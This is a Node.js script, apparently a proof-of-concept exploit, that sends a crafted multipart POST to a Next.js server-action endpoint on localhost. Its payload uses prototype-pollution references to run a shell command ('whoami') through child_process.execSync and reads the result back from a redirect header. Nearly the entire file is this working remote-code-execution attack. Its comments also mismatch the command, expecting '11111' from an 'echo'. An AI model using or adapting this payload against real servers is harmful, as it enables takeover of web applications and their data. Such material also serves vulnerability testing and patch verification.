
const http = require('http');

// RCE Payload to execute 'echo 11111'
// Note: This matches the "Test 2" payload from test-vuln.sh
const rceCmd = "whoami"; // simple check

// We need to properly escape the inner JS that executes on the server
const payload = JSON.stringify({
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": JSON.stringify({ "then": "$B1337" }),
    "_response": {
        "_prefix": `var res=process.mainModule.require('child_process').execSync('${rceCmd}').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: \`NEXT_REDIRECT;push;/?rce=\${res};307;\`});`,
        "_chunks": "$Q2",
        "_formData": { "get": "$1:constructor:constructor" }
    }
});

const boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";
const body = [
    `--${boundary}`,
    'Content-Disposition: form-data; name="0"',
    '',
    payload,
    `--${boundary}`,
    'Content-Disposition: form-data; name="1"',
    '',
    '"$@0"',
    `--${boundary}`,
    'Content-Disposition: form-data; name="2"',
    '',
    '[]',
    `--${boundary}--`
].join('\r\n');

const options = {
    hostname: 'localhost',
    port: 3000,
    path: '/',
    method: 'POST',
    headers: {
        'Content-Type': `multipart/form-data; boundary=${boundary}`,
        'Next-Action': 'x',
        'Content-Length': Buffer.byteLength(body),
        'User-Agent': 'Mozilla/5.0 Assetnote/1.0.0'
    }
};

console.log("Sending RCE payload...");

const req = http.request(options, (res) => {
    console.log(`STATUS: ${res.statusCode}`);
    console.log(`HEADERS: ${JSON.stringify(res.headers)}`);

    // Check for the specific redirect header that contains the RCE output
    if (res.headers['x-action-redirect']) {
        console.log(`\n[SUCCESS] Vulnerability Confirmed!`);
        console.log(`X-Action-Redirect: ${res.headers['x-action-redirect']}`);
        if (res.headers['x-action-redirect'].includes('11111')) {
            console.log("Payload execution verified (found 11111).");
        }
    } else {
        console.log("\n[Note] X-Action-Redirect header not found. This might mean the exploit failed or the output wasn't captured as expected.");
    }

    res.setEncoding('utf8');
    res.on('data', (chunk) => {
        // console.log(`BODY: ${chunk}`); // Only enable if debugging 500 errors
    });
    res.on('end', () => {
        console.log('No more data in response.');
    });
});

req.on('error', (e) => {
    console.error(`problem with request: ${e.message}`);
});

req.write(body);
req.end();
